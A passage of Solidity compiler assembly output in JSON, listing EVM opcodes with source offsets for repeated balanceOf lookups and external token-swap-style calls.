											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "59"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "tag",
											"source": 4,
											"value": "59"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "61"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "tag",
											"source": 4,
											"value": "61"
										},
										{
											"begin": 1776,
											"end": 1847,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1880,
											"end": 1886,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1921,
											"end": 1925,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1862,
											"end": 1865,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1857,
											"end": 1871,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1857,
											"end": 1871,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1880,
											"end": 1886,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1880,
											"end": 1886,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1872,
											"end": 1878,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1912,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1888,
											"end": 1912,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "64"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "tag",
											"source": 4,
											"value": "64"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "65"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1888,
											"end": 1927,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "tag",
											"source": 4,
											"value": "65"
										},
										{
											"begin": 1888,
											"end": 1927,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "66"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1857,
											"end": 1928,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "tag",
											"source": 4,
											"value": "66"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "67"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "tag",
											"source": 4,
											"value": "67"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "69"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "tag",
											"source": 4,
											"value": "69"
										},
										{
											"begin": 1857,
											"end": 1928,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 1961,
											"end": 1967,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2002,
											"end": 2006,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1943,
											"end": 1946,
											"name": "SWAP6",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1938,
											"end": 1952,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 1938,
											"end": 1952,
											"name": "SWAP5",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1961,
											"end": 1967,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1961,
											"end": 1967,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1953,
											"end": 1959,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 1993,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 1969,
											"end": 1993,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "72"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "tag",
											"source": 4,
											"value": "72"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "73"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1969,
											"end": 2008,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "tag",
											"source": 4,
											"value": "73"
										},
										{
											"begin": 1969,
											"end": 2008,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "74"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 1938,
											"end": 2009,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "tag",
											"source": 4,
											"value": "74"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "75"
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 1938,
											"end": 2009,
											"name": "PUSH",
											"source": 4,
